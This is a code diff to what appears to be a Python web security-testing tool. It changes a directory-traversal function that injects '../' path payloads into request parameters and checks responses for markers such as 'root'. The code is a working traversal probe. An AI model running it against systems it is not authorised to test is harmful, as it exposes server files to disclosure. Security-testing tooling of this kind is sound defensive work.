@@ -20,20 +20,20 @@ common_check = ["root","boh","boh2"]
 """
 Executes directory traversal attack
 """
-def execute_traversal(s,request,check,fname=common_files):
+def execute_traversal(s,request,check=common_check,fname=common_files):
     cprint("Executing directory traversal attack","V")
     params = request["params"]
     payloads = __payloadgenerator(fname)
     for park, parv in params.items():
         if parv == "?":
-            for p in payloads: 
+            for idx,p in enumerate(payloads):
                 params[park] = p
-                cprint("trying: "+p)
+                cprint("trying: "+p,"V")
+                cprint("looking for: "+check[idx%len(check)],"V")
                 r = execute_request(s,request)
-                if check in r.text:
+                if check[idx%len(check)] in r.text:
                     return True
     return False
-            
 
 
 """
@@ -41,4 +41,4 @@ Given a filename, this function returns a list of payloads that needs to be test
 a directory traversal attack.
 """
 def __payloadgenerator(fnames,depth=6):
-    return [dots*i+f for i in range(depth) for f in fnames]
+    return [dots*i+f for i in range(depth) for f in fnames ]
